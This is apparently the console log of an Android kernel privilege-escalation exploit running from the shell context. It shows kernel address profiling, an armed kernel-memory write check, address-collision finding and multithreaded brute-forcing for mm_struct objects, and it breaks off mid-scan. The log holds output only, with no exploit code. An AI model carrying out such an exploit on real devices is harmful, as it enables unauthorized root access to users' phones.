[32m[+] [0mpreload starting pid=14453
[32m[+] [0mstartup context pid=14453 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[32m[+] [0mbuild config pid=14453 label=pd2238_os6_163150_w10 slide=pselect main=pselect
[32m[+] [0mp0 profile pid=14453 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
[32m[+] [0mdirect-map base=ffffff8040000000 slide=0000000000000000
[32m[+] [0mckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=4f0f231c-722b-4339-8706-adfbdcc2f823 (odd: leaked scratch, even: aligned bootid+3)
[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
[33m[*] [0mpile-up verified: approx_time=2316
[33m[*] [0mstart finding collisisons
[33m[*] [0mtarget    00000074376020c8
[33m[*] [0m  00000061a28974b8
[33m[*] [0m  00000061a2f359a8
[33m[*] [0m  00000061a3c50280
[33m[*] [0m  00000061a3c9d4e8
[33m[*] [0m  00000061a44351a8
[33m[*] [0m  00000061a47a3d18
[33m[*] [0m  00000061a4ae1708
[33m[*] [0m  00000061a4d73b98
[33m[*] [0m  00000061a4f20900
[33m[*] [0m  00000061a4fc4e20
[33m[*] [0m  00000061a535aad0
[33m[*] [0m  00000061a6f22910
[33m[*] [0m  00000061a8084420
[33m[*] [0m  00000061a821e0f0
[33m[*] [0m  00000061a885e2f0
[33m[*] [0mfound 15 collisisons
[33m[*] [0mstart bruteforcing
[33m[*] [0m[  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
[33m[*] [0m[  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
[33m[*] [0m[  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
[33m[*] [0m[  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
[33m[*] [0m[  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
[33m[*] [0m[  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
[33m[*] [0m[  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
[33m[*] [0m[  1] tested 100000 candidates, scanning=0xffffff8805948f00
[33m[*] [0m[  5] tested 100000 candidates, scanning=0xffffffa805948f00
[33m[*] [0m[  4] tested 100000 candidates, scanning=0xffffffa005948f00
[33m[*] [0m[  2] tested 100000 candidates, scanning=0xffffff9005948f00
[33m[*] [0m[  3] tested 100000 candidates, scanning=0xffffff9805948f00
[33m[*] [0m[  0] tested 100000 candidates, scanning=0xffffff8005948f00
[33m[*] [0m[  7] tested 100000 candidates, scanning=0xffffffb805948f00
[33m[*] [0m[  6] tested 100000 candidates, scanning=0xffffffb005948f00
[33m[*] [0m[  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
[33m[*] [0m[  1] tested 200000 candidates, scanning=0xffffff880b2921c0
[33m[*] [0m[  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
[33m[*] [0m[  2] tested 200000 candidates, scanning=0xffffff900b2921c0
[33m[*] [0m[  3] tested 200000 candidates, scanning=0xffffff980b2921c0
[33m[*] [0m[  1] tested 300000 candidates, scanning=0xffffff8810bdb480
